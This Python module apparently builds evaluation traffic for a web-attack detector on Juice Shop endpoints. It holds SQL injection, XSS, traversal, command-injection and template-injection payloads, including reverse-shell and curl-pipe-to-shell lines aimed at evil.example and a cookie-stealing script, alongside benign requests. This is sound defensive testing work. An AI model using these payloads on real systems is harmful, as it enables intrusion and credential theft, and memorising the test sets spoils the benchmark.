"""Synthetic evaluation traffic: attacks injected into real Juice Shop endpoints, plus benign requests
that do NOT appear in the collected logs. The logs contain no attacks, so this is the only way to measure
detection and unseen-benign false positives. DEV payloads were used to pick the scoring statistic; TEST
payloads were written afterwards and never tuned on."""
from urllib.parse import quote

import data

QUERY_SLOTS = ["/rest/products/search?q={}", "/api/Challenges/?name={}", "/rest/user/whoami?fields={}",
               "/rest/products/{}/reviews", "/rest/track-order/{}"]
FILE_SLOTS = ["/ftp/{}", "/assets/public/images/products/{}", "/rest/products/search?q={}"]
ENCODERS = [lambda p: quote(p, safe=""),                       # what a browser sends
            lambda p: quote(quote(p, safe=""), safe=""),       # double-encoded evasion
            lambda p: quote(p, safe="'()*!~/")]                # raw-ish, as curl / scanners send

DEV = {
    "sqli": ["' OR 1=1--", "' OR '1'='1", "admin'--", "1' UNION SELECT NULL,NULL--", "1; DROP TABLE Users--",
             "')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--", "' AND SLEEP(5)--",
             "1 OR 1=1", "x' AND 1=CAST((SELECT sqlite_version()) AS INT)--", "' OR 1=1 LIMIT 1 --"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
            "<iframe src=\"javascript:alert(`xss`)\">", "\"><script>alert(document.cookie)</script>",
            "<body onload=alert(1)>", "javascript:alert(1)", "<a href=javascript:alert(1)>x</a>"],
    "traversal": ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd",
                  "..\\..\\windows\\win.ini", "/etc/passwd", "../../../../etc/passwd%00.md"],
    "cmdi": ["; cat /etc/passwd", "| id", "`whoami`", "$(whoami)", "&& ls -la", "|| ping -c 10 127.0.0.1"],
}
TEST = {
    "sqli": ["' oR 1=1#", "'/**/OR/**/1=1--", "1'%0aUNION%0aSELECT%0a1,2,3--", "' || (SELECT 1) || '",
             "1 AND 1=2 UNION ALL SELECT 1,group_concat(name),3 FROM sqlite_master--",
             "'; EXEC xp_cmdshell('dir')--", "' OR ''='", "1' ORDER BY 10--", "' HAVING 1=1--",
             "') OR ('a'='a", "-1 UNION SELECT 1,2,3", "' AND 1=0 UNION SELECT NULL, sql FROM sqlite_master--"],
    "xss": ["<ScRiPt>alert(1)</ScRiPt>", "<img/src=x/onerror=prompt(1)>", "<details open ontoggle=alert(1)>",
            "'-alert(1)-'", "<input autofocus onfocus=alert(1)>", "<video><source onerror=alert(1)>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>", "<marquee onstart=alert(1)>",
            "<iframe src=\"javascript:alert(`xss`)\"></iframe>", "<img src=1 href=1 onerror=\"javascript:alert(1)\">"],
    "traversal": ["%2e%2e/%2e%2e/%2e%2e/etc/passwd", "..%252f..%252f..%252fetc%252fshadow",
                  "../../../../../../windows/system32/drivers/etc/hosts", "....\\....\\boot.ini",
                  "/proc/self/environ", "../../../../../../etc/passwd%00"],
    "cmdi": ["; nc -e /bin/sh 10.0.0.1 4444", "| cat /etc/shadow", "`id`", "$(curl http://evil.example/x|sh)",
             "; wget http://evil.example/shell.sh -O /tmp/s", "%0aid"],
    "other": ["${jndi:ldap://evil.example/a}", "{{7*7}}", "http://169.254.169.254/latest/meta-data/",
              "file:///etc/passwd", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>",
              "{\"$ne\":null}", "%00", "A" * 400, "<%= 7*7 %>", "#{7*7}"],
}
RECON = ["/.git/config", "/.env", "/wp-login.php", "/phpmyadmin/", "/admin.php", "/server-status",
         "/actuator/env", "/cgi-bin/test.cgi", "/backup.zip", "/api/../../../etc/shadow",
         "/rest/admin/../../../../windows/win.ini", "/xmlrpc.php", "/.aws/credentials", "/console"]
SCANNER_UAS = ["sqlmap/1.7.2#stable", "Nikto/2.1.6", "python-requests/2.31.0", "Go-http-client/1.1",
               "masscan/1.3", "Wget/1.21", "zgrab/0.x", "nuclei - Open-source project"]

# FINAL: written after the TEST results had been seen and a normalisation bug fixed, so it is the
# only set that no design decision has looked at.
FINAL = {
    "sqli": ["' OR 'x'='x", "1' AND '1'='1", "admin' #", "'; WAITFOR DELAY '0:0:5'--", "1 UNION SELECT username,password FROM users",
             "' AND extractvalue(1,concat(0x7e,version()))--", "') UNION SELECT NULL,NULL,NULL--", "%' AND 1=1 AND '%'='",
             "1' AND ASCII(SUBSTRING((SELECT 1),1,1))>0--", "x'; SELECT pg_sleep(5)--"],
    "xss": ["<img src=x onerror=this.src='http://evil.example/?c='+document.cookie>", "<script src=//evil.example/x.js></script>",
            "<svg/onload=confirm(1)>", "\"onmouseover=\"alert(1)", "<object data=javascript:alert(1)>",
            "<style>@import'//evil.example/x.css';</style>", "<base href=//evil.example/>", "<form action=javascript:alert(1)><input type=submit>"],
    "traversal": ["..%c0%af..%c0%af..%c0%afetc/passwd", "..;/..;/etc/passwd", "/../../../../../etc/hosts",
                  "%5c..%5c..%5cwindows%5cwin.ini", "file/../../../etc/passwd", "....//....//....//....//etc//passwd"],
    "cmdi": ["|| whoami", "; sleep 10", "$(sleep 10)", "& type c:\\windows\\win.ini", "`cat /etc/passwd`",
             "\ncat /etc/passwd", "; rm -rf /tmp/x", "| nslookup evil.example"],
    "other": ["{{config.__class__.__init__.__globals__}}", "${7*7}", "%{(#_='multipart/form-data')}", "<!--#exec cmd=\"ls\"-->",
              "../../../../etc/passwd\x00.png", "gopher://127.0.0.1:6379/_PING", "{\"$gt\":\"\"}", "';alert(String.fromCharCode(88,83,83))//"],
}
FINAL_RECON = ["/.svn/entries", "/WEB-INF/web.xml", "/config.php.bak", "/phpinfo.php", "/solr/admin/", "/.DS_Store",
               "/jenkins/script", "/manager/html"]
FINAL_UAS = ["WPScan v3.8.22", "Hydra", "DirBuster-1.0-RC1", "libwww-perl/6.67", "Apache-HttpClient/4.5.13", "okhttp/4.9.3",
             "Java/11.0.2", "python-urllib3/1.26.5", "Scrapy/2.5.1"]
FINAL_BENIGN = (
    [f"/rest/products/search?q={q}" for q in ["pineapple", "orange juice", "tea", "blueberry", "gift card", "smoothie", "water",
                                               "limited edition", "organic"]] +
    [f"/rest/products/{i}/reviews" for i in (2, 6, 13, 21, 35)] + [f"/api/Products/{i}?d=Sun%20Oct%2025%202026" for i in (7, 22, 40)] +
    [f"/assets/public/images/products/{f}" for f in ["blueberry_juice.jpg", "ginger_shot.png", "lime_juice.jpg", "peach_smoothie.jpg"]] +
    ["/rest/user/security-question?email=user%40example.com", "/rest/country-mapping", "/rest/chatbot/status", "/api/Hints/",
     "/rest/repeat-notification?challenge=Score%20Board", "/api/Complaints/", "/api/Recycles/", "/rest/memories/", "/api/Quantitys/",
     "/rest/basket/9", "/rest/basket/18/checkout", "/api/BasketItems/21", "/rest/products/search?q=apple&sort=asc"]
)

# benign, valid traffic for this site that is absent from the collected logs
BENIGN_NOVEL = (
    [f"/rest/products/search?q={q}" for q in ["strawberry", "lemon", "kiwi", "green tea", "apple juice", "mango",
                                               "pomegranate", "juice", "carrot", "best seller"]] +
    [f"/api/Products/{i}?d=Sat%20Oct%2024%202026" for i in (3, 9, 17, 31, 44)] +
    [f"/rest/products/{i}/reviews" for i in (4, 11, 19, 27)] +
    [f"/assets/public/images/products/{f}" for f in ["mango_juice.jpg", "pomegranate_juice.jpg", "coconut_water.png",
                                                    "orange_juice.jpg", "kiwi_smoothie.jpg", "cherry_juice.png"]] +
    ["/rest/basket/12", "/rest/basket/31", "/api/Addresss/14", "/api/Cards/6", "/rest/wallet/balance",
     "/rest/order-history", "/rest/languages", "/api/Feedbacks/", "/rest/captcha/", "/rest/deluxe-membership",
     "/rest/track-order/5267-9c8b1e0f4a1d2e3f", "/rest/products/search?q=", "/api/Users/9", "/rest/user/whoami"]
)
# legitimate but unusual values (punctuation / passwords in the query string): known weak spot
BENIGN_HARD = ["/rest/products/search?q=o'reilly", "/rest/products/search?q=juice (500ml)",
               "/rest/user/change-password?current=Passw0rd!&new=Hello%23123&repeat=Hello%23123",
               "/rest/products/search?q=fruit & veg", "/rest/products/search?q=what is the price of apple juice for 2 kg"]


def _mk(uri, ua="Mozilla/5.0 (Windows NT 10.0)", ref="http://localhost/", method="GET"):
    return data.normalize(method, uri, ua, ref)


def attack_set(split):
    """Return [(category, raw_uri, normalised)] for 'dev' or 'test'."""
    out = []
    for cat, payloads in {"dev": DEV, "test": TEST, "final": FINAL}[split].items():
        for i, p in enumerate(payloads):
            slots = FILE_SLOTS if cat == "traversal" else QUERY_SLOTS
            for j, enc in enumerate(ENCODERS):
                uri = slots[(i + j) % len(slots)].format(enc(p))
                out.append((cat, uri, _mk(uri)))
    recon, uas = {"test": (RECON, SCANNER_UAS), "final": (FINAL_RECON, FINAL_UAS)}.get(split, ([], []))
    out += [("recon", u, _mk(u)) for u in recon]
    out += [("scanner-ua", "/rest/products/search?q=apple", _mk("/rest/products/search?q=apple", ua=u)) for u in uas]
    return out


def benign_novel(hard=False, final=False):
    uris = BENIGN_HARD if hard else BENIGN_NOVEL + (FINAL_BENIGN if final else [])
    return [(u, _mk(u)) for u in uris]


if __name__ == "__main__":
    for s in ("dev", "test", "final"):
        a = attack_set(s)
        print(s, len(a), "attacks;", sorted({c for c, *_ in a}))
    print(len(benign_novel()), "novel benign,", len(benign_novel(True)), "hard benign")
    for c, u, n in attack_set("test")[:4]:
        print(" ", c, "|", n)
